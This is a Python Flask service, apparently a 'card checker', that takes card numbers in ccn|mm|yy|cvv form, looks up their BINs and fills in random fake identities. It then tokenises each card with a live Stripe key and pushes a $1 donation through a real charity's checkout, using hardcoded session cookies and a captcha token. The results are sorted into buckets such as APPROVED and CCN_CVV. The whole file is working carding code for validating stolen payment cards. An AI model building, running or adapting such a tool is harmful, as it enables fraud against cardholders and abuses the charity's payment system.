import requests
import random
import json
import re
from datetime import datetime
import time
from typing import Dict, Tuple, Optional, Any
from flask import Flask, request, jsonify, Response
import threading
import queue

app = Flask(__name__)

class StripeChargeAPI:
    def __init__(self):
        self.state_abbreviations = {
            'alabama': 'AL', 'alaska': 'AK', 'arizona': 'AZ', 'arkansas': 'AR',
            'california': 'CA', 'colorado': 'CO', 'connecticut': 'CT', 'delaware': 'DE',
            'florida': 'FL', 'georgia': 'GA', 'hawaii': 'HI', 'idaho': 'ID',
            'illinois': 'IL', 'indiana': 'IN', 'iowa': 'IA', 'kansas': 'KS',
            'kentucky': 'KY', 'louisiana': 'LA', 'maine': 'ME', 'maryland': 'MD',
            'massachusetts': 'MA', 'michigan': 'MI', 'minnesota': 'MN', 'mississippi': 'MS',
            'missouri': 'MO', 'montana': 'MT', 'nebraska': 'NE', 'nevada': 'NV',
            'new hampshire': 'NH', 'new jersey': 'NJ', 'new mexico': 'NM', 'new york': 'NY',
            'north carolina': 'NC', 'north dakota': 'ND', 'ohio': 'OH', 'oklahoma': 'OK',
            'oregon': 'OR', 'pennsylvania': 'PA', 'rhode island': 'RI', 'south carolina': 'SC',
            'south dakota': 'SD', 'tennessee': 'TN', 'texas': 'TX', 'utah': 'UT',
            'vermont': 'VT', 'virginia': 'VA', 'washington': 'WA', 'west virginia': 'WV',
            'wisconsin': 'WI', 'wyoming': 'WY',
            'district of columbia': 'DC', 'guam': 'GU', 'american samoa': 'AS',
            'northern mariana islands': 'MP', 'puerto rico': 'PR', 'virgin islands': 'VI'
        }
        
        self.email_domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
        
    def get_state_abbreviation(self, state_name: str) -> str:
        """Convert state name to abbreviation"""
        return self.state_abbreviations.get(state_name.lower(), 'NY')
    
    def parse_card_input(self, card_input: str) -> Dict:
        """Parse card input in various formats"""
        # Remove any spaces
        card_input = card_input.strip()
        
        # Handle different separators
        if '|' in card_input:
            parts = card_input.split('|')
        elif '/' in card_input:
            parts = card_input.split('/')
        elif ';' in card_input:
            parts = card_input.split(';')
        elif ':' in card_input:
            parts = card_input.split(':')
        else:
            # Try to parse as space separated
            parts = card_input.split()
        
        if len(parts) < 4:
            raise ValueError("Invalid card format. Use: ccn|mm|yy|cvv")
        
        ccn = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvv = parts[3].strip()
        
        # Clean card number
        ccn = re.sub(r'\D', '', ccn)
        
        # Handle year format
        if len(yy) == 4:
            yy = yy[2:]  # Convert YYYY to YY
        elif len(yy) != 2:
            raise ValueError("Invalid year format. Use YY or YYYY")
        
        return {
            'ccn': ccn,
            'mm': mm.zfill(2),
            'yy': yy,
            'cvv': cvv
        }
    
    def bin_lookup(self, ccn: str) -> Dict:
        """Lookup BIN information"""
        try:
            # Extract first 6 digits
            bin_number = ccn[:6]
            url = f"https://bins.antipublic.cc/bins/{bin_number}"
            
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                bin_data = response.json()
                return {
                    'bin': bin_data.get('bin', bin_number),
                    'brand': bin_data.get('brand', 'UNKNOWN'),
                    'country': bin_data.get('country', 'UNKNOWN'),
                    'country_name': bin_data.get('country_name', 'UNKNOWN'),
                    'country_flag': bin_data.get('country_flag', '🏳️'),
                    'bank': bin_data.get('bank', 'UNKNOWN'),
                    'level': bin_data.get('level', 'UNKNOWN'),
                    'type': bin_data.get('type', 'UNKNOWN')
                }
            else:
                return {
                    'bin': bin_number,
                    'brand': 'UNKNOWN',
                    'country': 'UNKNOWN',
                    'country_name': 'UNKNOWN',
                    'country_flag': '🏳️',
                    'bank': 'UNKNOWN',
                    'level': 'UNKNOWN',
                    'type': 'UNKNOWN',
                    'error': 'BIN lookup failed'
                }
        except Exception as e:
            return {
                'bin': ccn[:6] if len(ccn) >= 6 else 'UNKNOWN',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN',
                'country_name': 'UNKNOWN',
                'country_flag': '🏳️',
                'bank': 'UNKNOWN',
                'level': 'UNKNOWN',
                'type': 'UNKNOWN',
                'error': str(e)
            }
    
    def get_random_user_info(self) -> Dict:
        """Fetch random user info from API"""
        try:
            response = requests.get('https://randomuser.me/api/?nat=us', timeout=10)
            data = response.json()
            user = data['results'][0]
            
            # Format email with random domain
            first_name = user['name']['first'].lower()
            last_name = user['name']['last'].lower()
            domain = random.choice(self.email_domains)
            email = f"{first_name}.{last_name}@{domain}"
            
            # Format phone number (remove non-digits)
            phone = re.sub(r'\D', '', user['phone'])
            if len(phone) == 10:
                phone = f"{phone[:3]}{phone[3:6]}{phone[6:]}"
            
            # Get state abbreviation
            state_name = user['location']['state'].lower()
            state_abbr = self.state_abbreviations.get(state_name, 'NY')
            
            return {
                'member_first_name': user['name']['first'],
                'member_last_name': user['name']['last'],
                'billing_first_name': user['name']['first'],
                'billing_last_name': user['name']['last'],
                'member_name': f"{user['name']['first']} {user['name']['last']}",
                'billing_address1': f"{user['location']['street']['number']} {user['location']['street']['name']}",
                'billing_city': user['location']['city'],
                'billing_state': state_abbr,
                'billing_postal_code': str(user['location']['postcode']),
                'billing_country': 'US',
                'member_email_address': email,
                'member_phone': phone,
                'nat': user['nat']
            }
            
        except Exception as e:
            # Return default info if API fails
            return self.get_default_user_info()
    
    def get_default_user_info(self) -> Dict:
        """Provide default user info if API fails"""
        return {
            'member_first_name': 'David',
            'member_last_name': 'Aloysius',
            'billing_first_name': 'David',
            'billing_last_name': 'Aloysius',
            'member_name': 'David Aloysius',
            'billing_address1': 'Mall Rd, Library Msll Rd',
            'billing_city': 'New York',
            'billing_state': 'NY',
            'billing_postal_code': '10080',
            'billing_country': 'US',
            'member_email_address': 'thebrokenfuxker@gmail.com',
            'member_phone': '9042252059',
            'nat': 'US'
        }
    
    def create_stripe_source(self, card_info: Dict, user_info: Dict) -> Optional[Dict]:
        """Create Stripe source with card details"""
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6,bn;q=0.5,nl;q=0.4,de;q=0.3',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }
        
        # Generate unique IDs for Stripe
        guid = f"{random.getrandbits(128):032x}"
        muid = f"{random.getrandbits(128):032x}"
        sid = f"{random.getrandbits(128):032x}"
        
        data = {
            'referrer': 'https%3A%2F%2Fdonate.wck.org',
            'type': 'card',
            'card[number]': card_info['ccn'],
            'card[cvc]': card_info['cvv'],
            'card[exp_month]': card_info['mm'],
            'card[exp_year]': card_info['yy'],
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'payment_user_agent': 'stripe.js%2F9390d43c1d%3B+stripe-js-v3%2F9390d43c1d%3B+card-element',
            'time_on_page': str(random.randint(100000, 200000)),
            'client_attribution_metadata[client_session_id]': f"{random.getrandbits(128):032x}",
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'card',
            'client_attribution_metadata[merchant_integration_version]': '2017',
            'key': 'pk_live_h5ocNWNpicLCfBJvLialXsb900SaJnJscz'
        }
        
        # Convert dict to form-urlencoded string
        data_str = '&'.join([f"{k}={v}" for k, v in data.items()])
        
        try:
            response = requests.post(
                'https://api.stripe.com/v1/sources',
                headers=headers,
                data=data_str,
                timeout=30
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                return None
                
        except Exception as e:
            return None
    
    def make_donation(self, stripe_source: Dict, user_info: Dict) -> requests.Response:
        """Make donation with Stripe source"""
        cookies = {
            'connect.sid': 's%3AjgaYr-ih0CCISD0HY6tHLgh1CLRTi2_n.Mwlls%2B43ueFQnoL8gTPiC25aNdpXOsmUSQCZ9VhN2s0',
            '__cfruid': '9e005834067899db9255bd89206c1ed78a0a36da-1765206334',
            'optimizelyEndUserId': 'oeu1765206337003r0.6503555141435973',
            'classy-session-id': '7a9ebe12-1cd1-4935-bb74-c7ed902d33fe',
            'pgdid': 'SD34PTQFqiwTr-_UBulOi',
            '__cf_bm': 'Ra_zB_yFnU27PTwhoSILrkAExqjbhhREDepg_8CiX_A-1765206339-1.0.1.1-gV6Co3MkM8T4bkRsTeV9YM7BcJ1v.ABp5OGkHZC1w29MbvlYo2gw3O1dU87R4_69nsyPNza41hDFutciuyub7HyJeMl6AA5oJA_Nmx50mfI',
            '_cfuvid': 'W6.rGa0wKhaYEiIYxAkVIsSlQR_IyaMvvJxo8ZQhEwc-1765206339637-0.0.1.1-604800000',
            'CSRF-TOKEN': 'ui4fObkI-G2DC2K_e0ZAJ9BVOgFu2KCq7sAQ',
            'XSRF-TOKEN': 'eyJpdiI6ImdEanc1UUs2Q2NNL01rNW1pMU1vamc9PSIsInZhbHVlIjoicjVJYlpheXcyMG42UDIzbXBWRjZBK2JPQTdnVGVlSHFuUGtpaFVwUldZcElsZDE5a1FRMFJ1b216NFNxRHkvQVV2OE5UY1FTaXlDaktjV0FCYlYzaHYzZWhmU0kxK2JBaVF5RFRSeVRNa3pLRnJVWllSZkNxa0JReVIvTk5MQlQiLCJtYWMiOiJiNDI2YWM3MzA3ZmNmOWI5NDQxZWQzMzhmYTRhNGRmYjVjNDRkYzJkMjBlNjkzMjMwNDA0ZmI0OTNmNjNmYWQyIiwidGFnIjoiIn0%3D',
            'sid': 'eyJpdiI6IkM1Y2wwK1RjZHNneVgvdVdKdzcxSHc9PSIsInZhbHVlIjoiV0M4eEpzaEhDMGtzeENXWG5BZWlROWJ5cGQyemJFU2F1WGlWMkZyS1BDd1RFSm40clRrVDZUODFKSkl1RWxWdndUaTJnb1AyZEdQNGlRZ0N2UVlGc0lJQnpWK3psZ2ljY1hvN3pLeHJ5aS92Z25Ga0xqZjBZWWlvTU1DdncwYjMiLCJtYWMiOiI5MDI5OTAyNzQ0ZDVmZDRkZDliOWRmOTA0NjQ5MWVjMGU5MGY0NGI3MjlkNTVhZGFmNzdmZDZkOGMwMDY0YjVmIiwidGFnIjoiIn0%3D',
            '_hp2_id.1566116007': '%7B%22userId%22%3A%225405055390403450%22%2C%22pageviewId%22%3A%223390023110109351%22%2C%22sessionId%22%3A%22628966895086684%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D',
            '_fbp': 'fb.1.1765206345238.2468081888445908',
            '_hp2_ses_props.1566116007': '%7B%22r%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22ts%22%3A1765206344446%2C%22d%22%3A%22donate.wck.org%22%2C%22h%22%3A%22%2Fgive%2F312884%2F%22%2C%22g%22%3A%22%23!%2Fdonation%2Fcheckout%22%7D',
            '_tt_enable_cookie': '1',
            '_ttp': '01KBZ7YRC91VK631QG80R61Y4H_.tt.1',
            '_hjSessionUser_3399662': 'eyJpZCI6IjQyMTgwMTMzLTBkMmQtNTE1NC1iNzFjLWY3NTNlYmYyNDg2MCIsImNyZWF0ZWQiOjE3NjUyMDYzNTI1MTUsImV4aXN0aW5nIjpmYWxzZX0=',
            '_hjSession_3399662': 'eyJpZCI6ImFlYzQ0ZDdjLTI1MTItNDE0ZC05MzA5LTBlNDBjYTJjODkwYyIsImMiOjE3NjUyMDYzNTI1MjEsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=',
            '_uetsid': '62e65420d44711f094ae49dd11c50b71|1h6dnev|2|g1o|0|2168',
            '_uetvid': '62e8f580d44711f09755f31d1568fce9|3lww3o|1765206353939|1|1|bat.bing.com/p/insights/c/y',
            '__stripe_mid': 'e88f497a-b85f-493a-8df3-90477c6b0fc9131bc4',
            '__stripe_sid': '81febf72-78e9-4e1b-b892-8d92785f2b704bcf66',
            'optimizelySession': '1765206365974',
            '_ga_5WKVY8503C': 'GS2.1.s1765206348$o1$g1$t1765206367$j41$l0$h0',
            'OptanonAlertBoxClosed': '2025-12-08T15:06:57.926Z',
            'OptanonConsent': 'isGpcEnabled=0&datestamp=Mon+Dec+08+2025+21%3A06%3A57+GMT%2B0600+(Bangladesh+Standard+Time)&version=6.32.0&isIABGlobal=false&hosts=&consentId=65875c37-7339-4750-92dd-a228db48534e&interactionCount=1&landingPath=NotLandingPage&groups=C0003%3A1%2CC0001%3A1%2CC0002%3A1%2CC0004%3A1',
            '_ga': 'GA1.2.1018295782.1765206349',
            '_gid': 'GA1.2.144202828.1765206419',
            'pjs_user_entered_custom_amount': 'yes',
            'pjs_manual_ach_donation': 'no',
            'ttcsid': '1765206352287::AqIg176ZPuXLDPehUGbG.1.1765206467101.0',
            'ttcsid_CSVQ22BC77UB52N3CER0': '1765206417809::OZSh3A8E4lsQeWy-6ZQD.1.1765206467102.0',
            '_gcl_au': '1.1.959331015.1765206349.1694289526.1765206363.1765206468',
        }
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6,bn;q=0.5,nl;q=0.4,de;q=0.3',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://donate.wck.org',
            'priority': 'u=1, i',
            'referer': 'https://donate.wck.org/give/312884/',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'traceparent': f'00-{random.getrandbits(128):032x}-{random.getrandbits(64):016x}-01',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-xsrf-token': 'ui4fObkI-G2DC2K_e0ZAJ9BVOgFu2KCq7sAQ',
        }
        
        json_data = {
            'payment': {
                'raw_currency_code': 'USD',
                'paypal': {'status': 'inactive'},
                'paypal_commerce': {'status': 'ready'},
                'venmo': {'status': 'ready'},
                'ach': {'status': 'ready'},
                'stripe': {
                    'status': 'ready',
                    'source': {
                        'id': stripe_source['id'],
                        'object': 'source',
                        'allow_redisplay': 'unspecified',
                        'amount': None,
                        'card': {
                            'address_line1_check': None,
                            'address_zip_check': None,
                            'brand': stripe_source['card']['brand'],
                            'country': 'US',
                            'cvc_check': 'unchecked',
                            'dynamic_last4': None,
                            'exp_month': stripe_source['card']['exp_month'],
                            'exp_year': stripe_source['card']['exp_year'],
                            'funding': stripe_source['card']['funding'],
                            'last4': stripe_source['card']['last4'],
                            'name': None,
                            'three_d_secure': 'optional',
                            'tokenization_method': None,
                        },
                        'client_secret': stripe_source['client_secret'],
                        'created': stripe_source['created'],
                        'currency': None,
                        'flow': 'none',
                        'livemode': True,
                        'owner': {
                            'address': None,
                            'email': None,
                            'name': None,
                            'phone': None,
                            'verified_address': None,
                            'verified_email': None,
                            'verified_name': None,
                            'verified_phone': None,
                        },
                        'statement_descriptor': None,
                        'status': 'chargeable',
                        'type': 'card',
                        'usage': 'reusable',
                    },
                },
                'cc': {'status': 'inactive'},
                'creditee_team_id': None,
                'method': 'Stripe',
                'gateway': {
                    'id': '21988',
                    'name': 'STRIPE',
                    'status': 'ACTIVE',
                    'currency': 'USD',
                },
            },
            'frequency': 'one-time',
            'items': [{
                'type': 'donation',
                'product_name': 'Donation',
                'raw_final_price': 1,
                'previous_frequency_price': 100,
            }],
            'fundraising_page_id': None,
            'fundraising_team_id': None,
            'designation_id': 150483,
            'answers': [],
            'billing_address1': user_info['billing_address1'],
            'billing_address2': '',
            'billing_city': user_info['billing_city'],
            'billing_state': user_info['billing_state'],
            'billing_postal_code': user_info['billing_postal_code'],
            'billing_country': user_info['billing_country'],
            'comment': 'Get a fwell Dinner!',
            'member_name': user_info['member_name'],
            'member_email_address': user_info['member_email_address'],
            'member_phone': user_info['member_phone'],
            'is_anonymous': False,
            'opt_in': True,
            'opt_in_wording': "It's okay to contact me in the future.",
            'application_id': '11153',
            'billing_first_name': user_info['billing_first_name'],
            'billing_last_name': user_info['billing_last_name'],
            'fee_on_top': False,
            'fixed_fot_percent': 5,
            'fixed_fot_enabled': False,
            'fee_on_top_amount': None,
            'gross_adjustment': {},
            'dedication': None,
            'company_name': None,
            'member_first_name': user_info['member_first_name'],
            'member_last_name': user_info['member_last_name'],
            'employer_match': None,
            'token': '0cAFcWeA6x9DL6lh1wG7HEqvHtxm3Lc83XJEWBlSDW4otltq1ilKwX7uFkC4Ru5SuU42zBcaH3JMD68iEEV6slF4GxF2uvu57ezauRtPODBrKgLwvfyGwV59Qj5wCyzzEtyezHJ0MBn0-P2EILMxmC_ZUEwbdh7W5_gm-J_LWo5gAF1CVhSB43m5eYpBZ-vZleSIB_hhE_DECiSq6KBJqvlLm6MfoXMhcIZrNAba5Cr9woKj6D7c9fgsXOXkBJYGqWkHL674dPLMMU559Tkb_ZUrhHgo1x1rrlerBv-4M8S5lL_S_2ZpzcZrEE8njbq8X6H0b8RwbKr-TQ3z4FTsn_q8NckTJTDwGxCPRsIFgMkmOQx5jSC2iTOKDE57aURjfQ_AxlTkgQ7RSkCsDx_AlVFCsjIP1RHXcJVgCtQGpwnPAKt_2z5QCv2rxGsyGZdnnPYcbnLXHE_27uJzWFAfB0OPNX-tydOGwR0_M7IcyAcPf5oNexd7vJmqwFijul4P2lnDJ5xuZDjZx1_hF7Jy2qPD9pLt5I9dOxXF7td4CEV3qPC-Ujq2GUyeZ1VhZeDbEuUhefZmlAf4dSWCtuPuYX8W3TrjrWKePkLncuRypXRNFBY22oj4bjMuL0sIg-SNTPOMY8gdL0mdQy90tT_x_oQrxVM1p3axjmeRB7A503Wwjf0djLa3qXXuOVSfkS-4F46_HVkEY6D-og8crZcj7Y-_yixjwkJGA1zc_q7dNgLkuuiWni05wcT102m7NFLh5FftR1jssxU3PCE4HpYAVYddtCdGOsJf08qfdVvl9oN9MwxMFx0-HEv1McAkDpSZ5r3R0e0TEGqONQH2SG9yg6dhjUCebPO7LMZAI0dqOw5iuhRilCNb6AIMJnm-r_OKz559QfuIBdADHQUJeG1K7JWXaEu9qi5DkitBx-0mED_eQ5tGwJUzXYqRtQiqUbZEyCKhnDWfbnRSMucrQWZXeBsqVIuQughPOXdHa8DEGsOof1Xr_5ZE3NSoOcV9wOj4ZNWXlqZQrTfxVBNmgDC8lVnbIPdO_mATQPCF6iErKTzKkwn-vLclRwEKbDAngMz-cdDIMCdN_va3t6EMHEAiyooqblIFOWS30fXpGhnvGirdjPDd5R3dlXlNVsmGQPOk9TprmX85yI8KOtwWActNw9m6dNjYaJ5T_CKzYBHzhascfus6pkSLAxkBfbrhlAKx9NAbjoTb0vUBOeJCCGqCJIJgd_C8249vGIFCSpXtDTUbC4ANdLj2ptKAHJU01EZI5DoiChfWn7EOB7Vcm6JDOUdBAPf4kzdGfqopxztbwxLnCjrbQ96MnOamdZ3b2WIsQFFKhf3yHzrss40tSsUYnhCE4L9j_5PwWboPk-oGt3xeyT-b3uxmy9ZFFRMXPTSUb3yO4M01E9cGA73MvKetpW0rVsjM0DMNXjv5PYMmTiLcrZ713DbIk6qzes3J_Eg1Ec3uuhNiskBzntPekx7nuOxSLyin5RO97QdpdAgrf1suQS6bbIE_en9gRhJAoSpGKl7tX7-aJFFNbWaxT6YkpuJcJlKHdcDTFgCj8gRNXS9NaFHLlBlASpC_xHcA02SWuAaSeQFcsYZASGtJ5WMCrDYPTQ__8RNAGVLFE-H5TBVITxUFt3SJSs4kgrpLVxiOKohHrfgooXHTuwCWLTecpiP2Mwvj_KVrgI5mQg2jMRsz22czaBWDtf0Uw_XPRkTRbkN2QDS4sPK0_OOANWdomkVwE-MltwmxKXAGccexwG49JfuoFH9RcKxbAnEV08e0sb0l2EROC_Ve2Brd433IFPE-2MtJiAPhSYEQ',
            'dafTransactionDetails': {},
        }
        
        return requests.post(
            'https://donate.wck.org/frs-api/campaign/312884/checkout',
            cookies=cookies,
            headers=headers,
            json=json_data,
            timeout=30
        )
    
    def categorize_response(self, response_text: str) -> Tuple[str, str]:
        """Categorize response and extract message"""
        response = response_text.lower()
        
        approved_keywords = [
            "succeeded", "payment-success", "successfully", "thank you for your support",
            "your card does not support this type of purchase", "thank you",
            "membership confirmation", "/wishlist-member/?reg=", "thank you for your payment",
            "thank you for membership", "payment received", "your order has been received",
            "purchase successful", "approved"
        ]
        
        insufficient_keywords = [
            "insufficient funds", "insufficient_funds"
        ]
        
        auth_keywords = [
            "mutation_ok_result", "requires_action"
        ]

        ccn_cvv_keywords = [
            "incorrect_cvc", "invalid cvc", "invalid_cvc", "incorrect cvc", "incorrect cvv",
            "incorrect_cvv", "invalid_cvv", "invalid cvv", "security code is invalid",
            "security code is incorrect", "zip code is incorrect", "zip code is invalid",
            "card is declined by your bank", "lost_card", "stolen_card",
            "transaction_not_allowed", "pickup_card"
        ]

        live_keywords = [
            "authentication required", "three_d_secure", "3d secure", "stripe_3ds2_fingerprint"
        ]
        
        declined_keywords = [
            "declined", "invalid", "failed", "error", "incorrect"
        ]

        # Extract message
        message = "Unknown response"
        try:
            # Try to parse as JSON
            resp_json = json.loads(response_text)
            if isinstance(resp_json, dict):
                # Look for error message
                if 'message' in resp_json:
                    message = resp_json['message']
                elif 'error' in resp_json:
                    message = resp_json['error']
                elif 'detail' in resp_json:
                    message = resp_json['detail']
        except:
            # Use first 200 chars as message
            message = response_text[:200]
        
        # Capitalize first letter
        if message:
            message = message[0].upper() + message[1:] if len(message) > 1 else message.upper()
        
        # Categorize
        if any(kw in response for kw in approved_keywords):
            return "APPROVED", message
        elif any(kw in response for kw in ccn_cvv_keywords):
            return "CCN_CVV", message
        elif any(kw in response for kw in live_keywords):
            return "3D_SECURE", message
        elif any(kw in response for kw in insufficient_keywords):
            return "INSUFFICIENT_FUNDS", message
        elif any(kw in response for kw in auth_keywords):
            return "STRIPE_AUTH", message
        elif any(kw in response for kw in declined_keywords):
            return "DECLINED", message
        else:
            return "UNKNOWN", message
    
    def process_card(self, card_input: str) -> Dict:
        """Process a single card and return results"""
        result = {
            'status': 'error',
            'message': 'Unknown error',
            'bin_info': {},
            'card_info': {},
            'response_details': {}
        }
        
        try:
            # Parse card info
            card_info = self.parse_card_input(card_input)
            result['card_info'] = {
                'number': f"{card_info['ccn'][:6]}******{card_info['ccn'][-4:]}",
                'expiry': f"{card_info['mm']}/{card_info['yy']}",
                'brand': 'UNKNOWN'
            }
            
            # BIN lookup
            bin_info = self.bin_lookup(card_info['ccn'])
            result['bin_info'] = bin_info
            
            # Get random user info
            user_info = self.get_random_user_info()
            
            # Create Stripe source
            stripe_source = self.create_stripe_source(card_info, user_info)
            
            if not stripe_source:
                result['message'] = 'Failed to create Stripe source'
                return result
            
            # Make donation
            response = self.make_donation(stripe_source, user_info)
            
            # Categorize response
            status, message = self.categorize_response(response.text)
            
            result['status'] = status
            result['message'] = message
            result['response_details'] = {
                'status_code': response.status_code,
                'response_time': datetime.now().isoformat()
            }
            
        except Exception as e:
            result['message'] = str(e)
            
        return result

# Initialize the API handler
stripe_api = StripeChargeAPI()

@app.route('/')
def home():
    return jsonify({
        'service': 'Stripe Charge $1 API',
        'version': '1.0.0',
        'endpoints': {
            '/onedollar': 'Process card charge (GET/POST)',
            '/health': 'Health check endpoint'
        },
        'usage': 'GET /onedollar?chg=4777920800183271|03|29|752'
    })

@app.route('/health')
def health():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'service': 'Stripe Charge API'
    })

@app.route('/onedollar', methods=['GET', 'POST'])
def one_dollar():
    """Process card charge endpoint"""
    # Get card input from query parameter or JSON body
    if request.method == 'GET':
        card_input = request.args.get('chg')
    else:
        data = request.get_json(silent=True) or {}
        card_input = data.get('chg') or request.form.get('chg')
    
    if not card_input:
        return jsonify({
            'status': 'error',
            'message': 'No card data provided. Use ?chg=ccn|mm|yy|cvv'
        }), 400
    
    # Process the card
    result = stripe_api.process_card(card_input)
    
    # Format response
    response_data = {
        'status': result['status'],
        'message': result['message'],
        'bin_info': result['bin_info'],
        'card_info': result['card_info'],
        'timestamp': datetime.now().isoformat(),
        'response': result['response_details']
    }
    
    return jsonify(response_data)

@app.route('/bin/<bin_number>')
def bin_lookup_endpoint(bin_number):
    """Direct BIN lookup endpoint"""
    if not bin_number.isdigit() or len(bin_number) < 6:
        return jsonify({
            'status': 'error',
            'message': 'Invalid BIN number. Must be at least 6 digits.'
        }), 400
    
    # Pad with zeros if needed
    bin_number = bin_number[:6].zfill(6)
    
    # Lookup BIN
    bin_info = stripe_api.bin_lookup(bin_number)
    
    return jsonify({
        'status': 'success',
        'bin': bin_info,
        'timestamp': datetime.now().isoformat()
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
